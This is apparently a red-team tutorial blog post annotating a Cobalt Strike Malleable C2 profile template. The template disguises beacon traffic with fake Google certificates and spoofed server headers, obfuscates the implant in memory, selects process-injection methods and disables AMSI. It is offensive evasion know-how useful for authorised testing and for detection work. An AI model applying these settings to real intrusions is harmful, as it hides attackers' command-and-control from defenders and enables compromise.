---
title: Cobalt Strike 4.0+ Malleable C2 Profile Guideline
author: bigb0ss
date: 2020-10-23 23:25:00 +0800
categories: [RedTeam, Cobalt Strike]
tags: [cobalt strike, malleable c2, redteam]
image: /assets/img/post/redteam-cobalt-strike/cs2.png
---

## Intro

We are now in the Cobalt Strike 4.0+ era. As Cobalt Strike is getting more popular choice for the Command and Control (“C2”) server nowadays, customizing your malleable C2 profile is imperative to disguise your beacon traffics as well as communication indicators. Additionally, it can also help dictate in-memory characteristics and beacon process injection behaviors.

The full profile creation guide can be found here [CS4.0_guideline.profile](https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile). It contains more details/instructions to craft the Malleable C2 profiles.

## Global Option Block

```yaml
set sample_name "bigb0ss.profile"; # Profile name (used in the Indicators of Compromise report)

set sleeptime "30000"; # Sleep time for the beacon callback (in milliseconds)
  
set jitter "50"; # Jitter to set %. In this example, the beacon will callback between 15 and 30 sec jitter
  
set host_stage "[true|false]"; # Staged payload allow or disallow (Note: Stager payloads are generally easier to get caught, but it's necessary for the space-restricted situations)
  
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.177"; # User-Agent Setup
```

## DNS Beacon Block

```yaml
set dns_idel "8.8.8.8"; # IP to indicate no tasks available. Avoid using bogon address "0.0.0.0" (This can be picked up as IOC)
  
set maxdns "[0-255]"; # Maximum length of hostname when uploading data over DNS (0-255)
  
set dns_sleep "1000"; # Force a sleep prior to each individual DNS request. (in milliseconds)
  
set dns_stager_prepend ""; # Prepend text to payload stage delivered to DNS TXT record stager
  
set dns_stager_subhost ".stage.8546."; # Subdomain used by DNS TXT record stager
  
set dns_max_txt "[0-255]"; # Maximum length of DNS TXT responses for tasks
  
set dns_ttl "1"; # TTL for DNS replies
```

## SMB Beacon Block

```yaml
set pipename "win_svc+8546"; # Name of pipe to use for SMB beacon's peer-to-peer communication
  
set pipename_stager "win_svc+8546"; # Name of pipe to use for SMB beacon's named pipe stager
```

## TCP Beacon Block

```yaml
set tcp_port "1337"; # TCP beacon listen port
```

## SSL/Code Certificate Block

```yaml
### Self-Signed Certificate HTTPS Beacon Block 
https-certificate {
    set C "US";                         # Country
    set CN "google.com";                # Common Name
    set L "Mountain View";              # Locality
    set O "Alphabet Inc.";              # Organization Name
    set OU "Google Certificate";        # Organizational Unit Name
    set ST "CA";                        # State
    set validity "365"; }
 
### Valid SSL Certificate HTTPS Beacon Block 
https-certificate {
    set keystore "domain.store";        
      # Private key, root cert, intermediate cert and domain cert - 
      # Java Keystore file should be in the same folder with Malleable C2 profile    
    set password "<mypassword>"; }         
      # The password to your Java Keystore

### Code Signing Certificate Block
code-signer {
    set keystore "keystore.jks";
    set password "<mypassword>";
    set alias "server"; }
```

## HTTP/S Block

```yaml
### HTTP/S Global Response Header Block
http-config {
    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        
    header "Server" "Microsoft-IIS/8.5";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Cache-Control" "max-age=1";
    header "Connection" "keep-alive";
    header "X-Powered-By" "ASP.NET";
    set trust_x_forwarded_for "[true|false]"; } # "true" if the team server is behind an HTTP redirector

### HTTP-GET Block
http-get {
    set uri "/image/xxxxxx"; # For multiple URIs = "/image /index /sexy"
    
    set verb "[GET|POST]" # Not really need to config this for http-get, but you can change it to POST if you want

    client {
        header "Host" "domain.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close"; }
    
### Data Transform Language
    metadata {
        base64;                     # Base64 Encode
        base64url;                  # URL-safe Base64 Encode
        mask;                       # XOR mask w/ random key
        netbios;                    # NetBIOS Encode 'a'
        netbiosu;                   # NetBIOS Encode 'A'
        prepend "user=";            # Prepend "string"
        append ".asp";              # Append "string"

### Termination Statements
        parameter "key";            # Store data in a URI parameter
        header "Cookie";            # Store data in an HTTP header
        uri-append;                 # Append to URI
        print; } # Send data as transaction body (set "verb" to POST to use "print")

    server {
        header "Server" "Apache"; # headers will be pulled from the http-config block, or manually add your preferences below:

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "user=";                # Prepend "string"
            append ".asp";                  # Append "string"
            print; } } } # Server block MUST be terminated with "print"

### HTTP-POST Block
http-post {
    set uri "/image/xxxxxx"; # For multiple URIs = "/image /index /sexy"    
      
    set verb "[GET|POST]"; # Use "GET" for GET Only C2

    client {
        header "Host" "domain.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        id {                                    
            base64;                    # Base64 Encode
            base64url;                 # URL-safe Base64 Encode
            mask;                      # XOR mask w/ random key
            netbios;                   # NetBIOS Encode 'a'
            netbiosu;                  # NetBIOS Encode 'A'
            prepend "user=";           # Prepend "string"
            append ".asp";             # Append "string"
            parameter "id";            # Add Beacon ID in parameter
            header "ID-Header"; }      # Add Beacon ID in header
        

        output {
            base64;                  # Base64 Encode
            base64url;               # URL-safe Base64 Encode
            mask;                    # XOR mask w/ random key
            netbios;                 # NetBIOS Encode 'a'
            netbiosu;                # NetBIOS Encode 'A'
            prepend "user=";         # Prepend "string"
            append "asp";            # Append "string"
            parameter "key";         # Store data in a URI parameter
            header "Cookie";         # Store data in an HTTP header
            uri-append; } }          # Append to URI

    server {
        header "Server" "Apache"; # headers will be pulled from the http-config block, or manually add your preferences below:

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "user=";                # Prepend "string"
            append ".asp";                  # Append "string"
            print; } } } # Server block MUST be terminated with "print"

### HTTP-Stager Block 
http-stager {
    set uri_x86 "/get32.gif"; # Set to download 32-bit payload stage    
      
    set uri_x64 "/get64.gif"; # Set to download 64-bit payload stage

    client {  # Clinet = Defining the client side of the HTTP transaction.
        header "Host" "domain.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
        header "Cookie" "XXXXXX"
        parameter "id" "8645"; }

    server { # headers will be pulled from the http-config block, or manually add your preferences below:
        header "Server" "Apache";

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "user=";                # Prepend "string"
            append ".asp";                  # Append "string"
            print; } } } # Server block MUST be terminated with "print"
```

## Malleable PE & In-Memory Evasion and Obfuscation Block

```yaml
stage {
    set checksum "0"; # The CheckSum value in Beacon's PE header    
    
    set cleanup "[true|false]"; # If "true," free memory associated with the Reflective DLL package when it's no longer needed    
      
    set compile_time "02 April 2020 02:35:00"; # The build time in Beacon's PE header    
      
    set entry_point "92145"; # The EntryPoint value in Beacon's PE header    
      
    set image_size_x86 "512000"; # SizeOfImage value in x86 Beacon's PE header ([!] Avoid using image_size_x86 if module_x86 in use)    
      
    set image_size_x64 "512000"; # SizeOfImage value in x64 Beacon's PE header ([!] Avoid using image_size_x64 if module_x64 in use)    
      
    set module_x86 "legit.dll"; # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc    
      
    set module_x64 "legit.dll"; # Ask the x64 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc    
      
    set name "legit.dll"; # The Exported name of the Beacon DLL    
      
    set rich_header "\x00\x00\x00\x00"; # Meta-information inserted by the compiler. The Rich header is a PE section that serves as a fingerprint of a Windows’ executable build environment

    set sleep_mask "[true|false]"; # Obfuscate Beacon, in-memory, prior to sleeping    
      
    set stomppe "[true|false]"; # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
                                                        
    set obfuscate "[true|false]"; # Obfuscate the Reflective DLL's import table (can be IOC), overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers
                                                     
    set userwx "[true|false]"; # Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory (can be IOC)
                                               
    transform-x86 {
        prepend "\x90\x90\x90"; # Inserts a string before Beacon's Reflective DLL --> Defeat analysis on the first few bytes of a memory segment of an injected DLL        
        
        append "\x90\x90\x90"; # Adds a string after the Beacon Reflective DLL        
          
        strrep "ReflectiveLoader" ""; } # Replaces a string within Beacon's Reflective DLL --> Defeat analysis on tool-specific strings

    transform-x64 {
        prepend "\x90\x90\x90";                     
        append "\x90\x90\x90";                      
        strrep "ReflectiveLoader" ""; }

    data "<whatever string>"; # Adds a string as-is (ex) "bigb0ss")    
      
    string "<whatever string>"; # Adds a null-terminated string (ex) {'b','i','g','b','0','s','s','\0'})    
      
    stringw "<whatever string>"; } # Adds a wide (UTF-16LE encoded) string (ex) 0062 0069 0067 0062 0030 0073 0073)
```

## Process Injection Block

```yaml
process-inject {
    set allocator "[VirtualAllocEx|NtMapViewOfSection]"; # The preferred method to allocate memory in the remote process. 
                                                              
    set min_alloc "4096"; # Minimum amount of memory to request for injected content    
      
    set startrwx "[true|false]"; # Use RWX as initial permissions for injected content. Alternative is RW.    
      
    set userwx "[true|false]"; # Use RWX as final permissions for injected content. Alternative is RX.

    transform-x86 {
        prepend "\x90\x90\x90";                     
        append "\x90\x90\x90"; }

    transform-x64 {
        prepend "\x90\x90\x90";                     
        append "\x90\x90\x90"; }

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000"; # Current process only ([!] Sysmon EventID 8 - a process creates a thread in another process)        
          
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000"; # No cross-session ([!] Sysmon EventID 8 - a process creates a thread in another process)        
          
        NtQueueApcThread; # Uses RWX shellcode and "CreateThread" start address. Same-arch injection only        
          
        NtQueueApcThread-s; # "Early Bird" injection technique. Suspended process only
          
        RtlCreateUserThread; # Risky on XP-era targets. Uses RWX shellcode for x86 -> x64 injection. ([!] Sysmon EventID 8 - a process creates a thread in another process)        
          
        SetThreadContext; } } # Suspended process only
```

## Post-Exploitation Block

```yaml
post-ex {
        set spawnto_x86 "%windir%\\syswow64\\<mfpmp>.exe";              
        set spawnto_x64 "%windir%\\sysnative\\<mfpmp>.exe";             
        set obfuscate "[true|false]"; # Obfuscate the permissions and content of our post-ex DLLs
          
        set smartinject "[true|false]"; # Directs Beacon to embed key function pointers (ex) GetProcAddress, LoadLibrary) into its same-arch post-ex DLLs 
                                                                    
        set amsi_disable "[true|false]"; } # Disable AMSI (Antimalware Scan Interface) in powerpick, execute-assembly and psinject before loading .NET or PS code
```